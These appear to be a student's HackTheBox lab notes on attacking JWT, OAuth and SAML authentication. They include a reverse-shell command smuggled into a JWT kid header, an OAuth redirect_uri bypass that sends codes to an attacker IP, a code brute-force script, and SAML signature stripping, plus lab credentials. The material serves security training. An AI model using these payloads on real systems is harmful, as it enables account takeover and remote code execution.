## JWT

Add VM name to `/etc/hosts` file (`http://jwt.htb.net`)
### Missing Signature Validation
#### Example JWT
```
{
	"name": "HTBJWT",
	"value": 1337
	"admin": false
}
```
If the server is not validating the signature, you can edit the JWT to set the private claim value of admin to **true** and send the JWT
#### Navigate to URL
```
http://jwt.htb.net
```
#### Open Burp Suite
#### On website, enter nothing into the box and click "Test"

Request:

POST /jwt/noverification HTTP/1.1
Host: jwt.htb.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://jwt.htb.net/
Content-Type: application/json
Authorization: Bearer
Origin: http://jwt.htb.net
Content-Length: 15
Connection: close

{"jwtToken":""}

Key things:

    Request Type: POST
    Endpoint:/jwt/noverification
    The JWTToken parameter and value

![[JWT no sig 1.png]]
#### Forward and view the response
![[jdub.png]]
The success status was false
#### Navigate to `https://jwt.io` and view the Payload section
#### We must set the admin private claim to true and copy the final token
![[jwt token.png]]
Payload:

{
  "admin": true
}

Full token:

eyJhbGciOiJI...SNIP...1xL10_flfoTTs
#### Follow the same steps with Burp Suite above, except this time, send the token
![[send token.png]]
![[token intercept.png]]
#### Forward the request
Output:
![[success for jwt.png]]
### None Algorithm Attack
#### Navigate to `jwt.io` and set the payload to `"admin":true`
![[none algo.png]]
#### Base64 decode the HEADER (`alg` and `type` portions)
```Shell
echo eyJhbG..<SNIP>..CJ9 | base64 -d
```
Output:
```
{"alg":"HS256","typ":"JWT"}
```
#### Make `alg` set to `none`, then convert to base64 encoding by navigating to the Console in the Browser's Inspector tools. Enter the following:
```
btoa('{"alg":"none","typ":"JWT"}')
```
![[none algo base64 encode.png]]
==NOTE: Remove `=` from the header before adding back onto the JWT==
#### Paste into `jwt.io` and remove the signature portion (last portion)
![[bye bye sig 1.png]]
#### Paste into JWT field in Burp Suite
![[none algo inject.png]]

![[none algo flag.png]]
### Weak Secret
#### Install `gojwtcrack` from GitHub
```Shell
go install github.com/x1sec/gojwtcrack@latest
```
#### Get a JWT 
![[jwt weak secret.png]]
#### Copy the JWT into a `tokens.txt` file
```Shell
echo "eyJhbGci....SNIP....33STKB89JsY" > tokens.txt
```
#### Use `gojwtcrack` and rockyou.txt to try and crack the token
```Shell
~/go/bin/gojwtcrack -t tokens.txt -d /usr/share/wordlists/rockyou.txt
```
#### Set `"admin":true` in the payload and then add the `secret`
![[lavra inject.png]]
#### Use the JWT output as your token to inject on Burp
![[lavra to token.png]]

![[lavra jwt to burp.png]]

![[lathra flag.png]]
### Insecure KID Parameter Processing
#### Get the JWT
![[KID jwt.png]]
#### Copy the token into JWT.io and change `"admin"` to `true`
![[kid admin true io.png]]
#### As you can see, the `kid` claim has the value `default.key`, which is the path to the key being used. If we fuzz the `kid` value with random characters 'or use a wordlist', we can see if it causes any errors that may indicate a vulnerability
```
{
	"alg": "HS256",
	"typ": "JWT",
	"kid": "\"'(){}[]&;/'"
}
```
We need to escape the double quotes, so ensure that you use back slashes as we do above.

![[default key mod.png]]
#### Copy the token and submit it, intercept the request and response
![[jwt key inject error check.png]]

![[kid inject error.png]]
#### Generate a new token
```
{
	"alg": "HS256",
	"typ": "JWT",
	"kid": "\"'(){}[]&;/'(}{'£%^"
}
```
![[JWT KID RCE test.png]]
#### Send the token through Burp
![[kid rce inject.png]]
Response:
```
{"success":false,"msg":"/bin/sh: syntax error: unexpected \"(\"\n"}
```
#### Test for Remote Code Execution by putting the following bash script into the JWT.io parameters
```Shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <TUN0 IP> 9001 >/tmp/f
```
HEADER:
```
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "default.key\";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <TUN0 IP> 9001 >/tmp/f;\""
}
```
#### Start a netcat listener
```Shell
nc -lnvp 9001
```
#### Copy the JWT into the Token Param field
![[rce token.png]]
![[rce send.png]]
![[kid rce receive.png]]
## OAuth
### Common OAuth Security Flaws:
- Improper implementation of the implicit grant type
- Flawed CSRF protection
- Leaking authorization codes and access tokens
- Flawed scope validation
- Unverified user registration
- Host header injection
- Reusable OAuth access token
### redirect_uri Misconfiguration
#### Navigate to `http://securedocs.htb.net/` and click `Register`
![[openredir1.png]]
#### Fill out the required fields and click Submit. Once you've authenticated, you'll see the following:
![[openredir2.png]]
#### Click `Upload Documents`, then save a random text file and upload it
![[opendir3.png]]
#### View the file.txt file and see what the functionality is doing
![[openredir4.png]]
It seems it's just storing the file and then the description. If we click the hyperlink, it looks like we can view that file's content.
#### Navigate to the second site at `http://deletedocs.htb.net` and read the description:
"Delete anything from Securedocs securely and quickly. Delete multiple documents from your SecureDocs safely and quickly"

It seems we can delete documents using this sub-domain.
#### Click `login` and intercept the request with Burp
![[openredir5.png]]
#### Forward this request. Just take note of the request method, endpoints, etc., in case we need that information later.
![[openredir6.png]]
- Method: GET
- Endpoint: `/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2Fdeletedocs.htb.net%2Fcallback&scope=view_documents%20delete_document`
This is the OAuth Request. We can see the `redirect_uri` is deletedocs.htb.net, and the Host is `securedocs.htb.net`.
#### When testing an application, it's best first to see if it works as intended, so we'll forward this request without any changes.
![[openredir7.png]]
We get redirected to login. Just enter your credentials and intercept the request:
#### Forward the first request, then spot the OAuth request:
![[openredir8.png]]
#### Click Allow
![[openredir9.png]]
#### Forward the request
![[openredi10.png]]
#### Forward the Request
![[openredir11.png]]
The access code indicates success
#### Bypassing redirect_uri Filters
##### Open a netcat listener
```Shell
nc -lnvp 1337
```
##### Navigate back to Delete Docs and go back to the Login option and intercept the request
##### Modify the `redirect_uri` parameter to see if the OAuth Provider verifies the URI it is redirecting to
```
/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2F10.10.14.207:1337%2Fcallback&scope=view_documents%20delete_document
```
![[openredir12.png]]
Response:
![[openredir13.png]]
Indicates there may be a white list filter in place
#### Try adding the `@` symbol between `deletedocs.htb.net` and `<kali ip:port>`
```html
securedocs.htb.net/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2Fdeletedocs.htb.net%40http://10.10.14.207:1337&scope=view_documents delete_document
```
#### A code should be received
![[code bitch.png]]

***We can utilize this link with any XSS vulnerability or by social engineering someone to click it, and once they do, we would obtain their secret key and be able to authenticate to their account***
### Open Redirect
- Navigate to http://deletedocs.htb.net and authenticate with an account you've previously created (if you've restarted the target, create a new account on securedocs.htb.net and upload a file.txt file).
#### Browsing the application, we can see that our file is stored in a hyperlink
![[redir1 1.png]]
#### Craft an alternate URL to test with (e.g., `http://deletedocs.htb.net/?redirect=https://hackthebox.com`)
- When you click the file link, it takes you to the hackthebox.com page
#### Start a netcat listener
```Shell
nc -lvp 1337
```
#### Construct the URL based on the OAuth entry for getting into DeleteDocs
```html
http://securedocs.htb.net/oauth/authorize?response_type=code&redirect_uri=http://deletedocs.htb.net/?redirect=http://<SERVER_IP>:<PORT>&scope=view_profile%20delete_document%20view_documents&client_id=deletedocs
```
OR:
```html
http://securedocs.htb.net/oauth/authorize?response_type=code&client_id=deletedocs&redirect_uri=http%3A%2F%2Fdeletedocs.htb.net/?redirect=http://10.10.15.29:1337%2F&scope=view_documents%20delete_document
```
![[redir2.png]]
#### Note: If you find an open redirect in the scope of the OAuth `redirect_uri` flow, you can easily abuse it.

### Brute Forcing Weak Access Tokens
#### Navigate to http://securedocs.htb.net and authenticate with your credentials. Then, navigate to http://deletedocs.htb.net and click Login to start intercepting the traffic
![[brute force1.png]]
#### This is the first request. We'll forward this.
![[brute force2.png]]
We need to note a few key things here.
- The code is five digits long
- The endpoint `/callback?code=`
- Request Method:`GET`
- Host:`deletedocs.htb.net`
#### Python Script for Brute Forcing
```Python
import requests, sys, time

def brute():
	try:
		value = range(100000)
		for val in value:
			url = sys.argv[1]
			r = requests.get(url + '/callback?code=' + str(val))
			if "Forbidden" not in r.text:
				print("Number found!", val)
				time.sleep(20)
			elif r.status_code == 200:
				print(f"Trying {val}")
	except IndexError:
		print("Enter a URL e.g.: http://<lab-ip>/")

brute()
```
- requests: Allows us to send GET, POST etc requests to a web server
- sys: Allows us to parse system arguments
- time: Allows us to call things such as `sleep()` and get time stamps etc
- `try`: just allows us to work with error exceptions.
#### Run script
```Shell
python3 oauth-brute.py http://deletedocs.htb.net
```
![[brute force3.png]]
## SAML
#### Sample Creds:
- `admin:lv38g^e6A5JkJN`
- `jasmine:vbw58Uh^X7P1Xo`
- `jake:ReAlLyStRoNgPaSsWoRd123!!!` (Note that these credentials won't work on `sp3.htb.net` / `idp3.htb.net`)
#### Sample SAML Request:
```xml
<?xml version="1.0"?>
<samlp:AuthnRequest 
                    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                    AssertionConsumerServiceURL="https://ship-inlanefreight.com/sso/SAML2/POST" 
                    Destination="https://ship-inlanefreight.com/idp/profile/SAML2/Redirect/SSO" 
                    ID="_cdae718238ba9c207a35cc7c70b046a0" 
                    IssueInstant="2019-03-12T20:54:58Z" 
                    ProtocolBinding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST" 
                    Version="2.0">
  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://shiip-inlanefreight.com/shipservice</saml:Issuer>
  <samlp:NameIDPolicy AllowCreate="1"/>
</samlp:AuthnRequest>
```
- `AssertionConsumerServiceURL`: This identifies where the IDP should send the SAML Response after authentication.
- `Destination`: Indicates the address to which the request should be sent (IDP).
- `ProtocolBinding`: This typically accompanies the `AssertionConsumerServiceURL` attribute and defines the mechanism by which SAML protocol messages will be transmitted.
- `saml:Issuer`: Identifies the entity that generated the request message.
#### Raw SAML response:
```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <samlp:Response Destination="https://shibdemo-sp1.test.edu/Shibboleth.sso/SAML2/POST" ID="_2af3ff4a06aa82058f0eaa8ae7866541" InResponseTo="_cdae718238ba9c207a35cc7c70b046a0" IssueInstant="2019-03-12T20:54:54.061Z" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
     <saml:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://ship-inlanefreight.com/idp/shipservice</saml:Issuer>  
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
    <ds:SignedInfo>
      <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
      <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
      <ds:Reference URI="#_2af3ff4a06aa82058f0eaa8ae7866541">
        <ds:Transforms>
          <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
          <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        </ds:Transforms>
        <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
        <ds:DigestValue>Se+WwXd5r44J56LauTz/wnP3jWg=</ds:DigestValue>
      </ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>--snip--</ds:SignatureValue>
    <ds:KeyInfo>
      <ds:X509Data>
        <ds:X509Certificate>--snip--</ds:X509Certificate>
      </ds:X509Data>
    </ds:KeyInfo>
  </ds:Signature>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion xmlns:xs="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" ID="_e0acf8ced7e2cafc7c65b2c097842486e0838d76e0" IssueInstant="2019-03-13T22:44:33Z" Version="2.0">
    <saml:Issuer>https://ship-inlanefreight.com/idp/shipservice</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
        <ds:Reference URI="#_e0acf8ced7e2cafc7c65b2c097842486e0838d76e0">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
          <ds:DigestValue>kDAb3x6EFvA9VblqwbIFcCnLQvo=</ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue>--snip--
      </ds:SignatureValue>
      <ds:KeyInfo>
        <ds:X509Data>
          <ds:X509Certificate>--snip--</ds:X509Certificate>
        </ds:X509Data>
      </ds:KeyInfo>
    </ds:Signature>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:transient" SPNameQualifier="https://shibdemo-sp1.test.edu/shibboleth">_29b7a1a396d841b09fcf2b0bd8ce88fed6ad70e1a7</saml:NameID>
      <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml:SubjectConfirmationData InResponseTo="_cdae718238ba9c207a35cc7c70b046a0" NotOnOrAfter="2019-03-13T22:49:33Z" Recipient="https://ship-inlanefreight.com/sso/SAML2/POST"/>
      </saml:SubjectConfirmation>
    </saml:Subject>
    <saml:Conditions NotBefore="2019-03-13T22:44:03Z" NotOnOrAfter="2019-03-13T22:49:33Z">
      <saml:AudienceRestriction>
        <saml:Audience>https://ship-inlanefreight.com/idp/shipservice</saml:Audience>
      </saml:AudienceRestriction>
    </saml:Conditions>
    <saml:AuthnStatement AuthnInstant="2019-03-13T22:44:33Z" SessionIndex="_a52c3c1242663b44b706523f0a2ada454eb997e40a" SessionNotOnOrAfter="2019-03-14T06:44:33Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
    <saml:AttributeStatement>
      <saml:Attribute Name="uid" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">John</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="mail" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">John@inlanefreight.com</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="first_name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">John</saml:AttributeValue>
      </saml:Attribute>
      <saml:Attribute Name="last_name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
        <saml:AttributeValue xsi:type="xs:string">Gabreil</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```
- `ds:Signature`: This is an XML Signature that protects the integrity of and authenticates the issuer of the assertion. The SAML assertion may also be signed but it doesn’t have to be. The example above contains two `ds:Signature` elements. The reason is that one is the message’s signature, while the other is the Assertion’s signature.
- `saml:Assertion`: Contains information about the user’s identity and potentially other user attributes.
- `saml:Subject`: Specifies the principal that is the subject of all of the statements in the assertion.
- `saml:StatusCode`: A code representing the status of the activity carried out in response to the corresponding request.
- `saml:Conditions`: This specifies conditions such as the time an Assertion is valid for and that the Assertion is addressed to a particular Service Provider.
- `saml:AuthnStatement`: States that the IDP authenticated the Subject of the Assertion.
- `saml:AttributeStatement`: Contains attributes that describe the Subject of the Assertion.
### Weak Public/Private Keys
- Vector: Change the `name ID` in the SAML response in order to log in as that user due to lack of signature checking
#### Identifying Weak Keys
##### Navigate to `http://sp1.htb.net` and log in with the credentials provided. 
![[login - weak keys.png]]
##### Forward Burp requests till you click login after using creds
![[login - weak keys 1.png]]
##### Receive and copy the SAML Response
![[login - weak keys 2.png]]
##### URL decode, then base64 decode
![[login - weak keys 3.png]]
##### The following can be picked out from the response:
```xml
<ds:KeyInfo><ds:X509Data><ds:X509Certificate>MIIB7zCCAVgCCQDFzbKIp7b3MTANBgkqhkiG9w0BAQUFADA8MQswCQYDVQQGEwJVUzELMAkGA1UECAwCR0ExDDAKBgNVBAoMA2ZvbzESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTEzMTAwMjAwMDg1MVoXDTE0MTAwMjAwMDg1MVowPDELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAkdBMQwwCgYDVQQKDANmb28xEjAQBgNVBAMMCWxvY2FsaG9zdDCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEA1PMHYmhZj308kWLhZVT4vOulqx/9ibm5B86fPWwUKKQ2i12MYtz07tzukPymisTDhQaqyJ8Kqb/6JjhmeMnEOdTvSPmHO8m1ZVveJU6NoKRn/mP/BD7FW52WhbrUXLSeHVSKfWkNk6S4hk9MV9TswTvyRIKvRsw0X/gfnqkroJcCAwEAATANBgkqhkiG9w0BAQUFAAOBgQCMMlIO+GNcGekevKgkakpMdAqJfs24maGb90DvTLbRZRD7Xvn1MnVBBS9hzlXiFLYOInXACMW5gcoRFfeTQLSouMM8o57h0uKjfTmuoWHLQLi6hnF+cvCsEFiJZ4AbF+DgmO6TarJ8O05t8zvnOwJlNCASPZRH/JmF8tX0hoHuAQ==</ds:X509Certificate></ds:X509Data></ds:KeyInfo>
```
##### Copy the last part, `DgmO6TarJ8O0...SNIP...tX0hoHuAQ==` of the public key and perform some OSINT (e.g., Google)
![[login - weak keys 4.png]]
![[login - weak keys 5.png]]
##### The X509 certificate is used for encryption and signing. Now find the private key via [samlidptest](https://github.com/rstudio/crewjam-saml/blob/master/samlidp/samlidp_test.go)
![[login - weak keys 6.png]]
#### Attacking Weak Keys
- Some private keys may be found online from their public keys
- For this use the Burp Suite extension called [SAMLRaider](https://github.com/PortSwigger/saml-raider#:~:text=Start%20the%20Burp%20Suite%20and%20click%20at%20the,hit%20the%20Install%20button%20to%20install%20our%20extension)
##### Copy the Private Key and Certificate from `samlidptest` and save them as in files as `private.pem` and `pub.crt`
##### Import the `pub.crt` into the Burp Suite SAML extension
![[login - weak keys 7.png]]
##### Click the `Traditional RSA Pem` button and import `private.pem`
![[login - weak keys 8.png]]
##### Now it should look like this:
![[login - weak keys 9.png]]
##### Next, we'll need the decoded SAML Response body values.
```xml
<saml:Attribute Name="username" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri"><saml:AttributeValue xsi:type="xs:string">admin</saml:AttributeValue>
```
##### Navigate to the Burp Repeater, where the request was saved and load the SAMLRaider Extension
![[login - weak keys 10.png]]
##### Confirm the keys were imported ^^
##### Change the username value from `admin` to `hackme`
![[login - weak keys 11.png]]
##### Send the request but do not click Follow redirection. The status code returned will be a `302`.
![[login - weak keys 12.png]]
It's attempting to redirect us back to the `root` web directory. We do not want this.
##### We now need to Re-Sign the Assertion. We can do this because we have the private/public key.
![[login - weak keys 13.png]]
##### Now send the request
![[login - weak keys 14.png]]
##### Copy the JWT from the response and navigate to jwt.io

### No Signature Verification
#### Open Burp and intercept the HTTP Traffic, navigate to http://sp2.htb.net and log in with the credentials provided at the start
![[no sig0.png]]
#### URL decode the response from the `/sp/acs` endpoint
![[no sig1.png]]
#### URL decode, then base64 decode the SAMLResponse value, and change the `username` SAMLAttribute to `hackme`
![[no sig2.png]]
![[no sig3.png]]
*If no signature checks are happening, we should be able to re-encode this and pass it back to the server in the hope we become the `hackme` user and get returned the flag.* 
#### Use the browser inspector tools to encode the modified SAML XML using "btoa(`saml xml`)"
![[no sig5.png]]
#### Copy the whole string, minus the quotes, and URL encode the using the JS Method `encodeURIComponent("base64")`
![[no sig6.png]]
![[no sig7.png]]
#### Copy and paste into the `SAMLResponse=` parameter of the intercepted request, then forward it to receive a JWT
![[no sig8.png]]
#### Use http://jwt.io to decode the JWT
![[no sig9.png]]
### Signature Stripping Attack
#### Navigate to `http://sp3.htb.net` . You'll fail to log in with the `hackme` user, but you can still generate a SAMLResponse with another user (e.g., `jasmine:vbw58Uh^X7P1Xo`)
![[no sig10.png]]
#### Send the request to Burp Repeater and enable the plugin, then beautify the XML Data for easier editing
#### Look for the `<ds:SignatureValue>` parameter
![[sig strip1.png]]
#### Strip the first and second iterations of signatures
![[sig strip2.png]]
#### Change the username from `jasmine` to `hackme`
![[sig strip3.png]]
#### Copy the new payload and send to SAMLRaider, then send the request
![[sig strip4.png]]
#### Decode the JWT
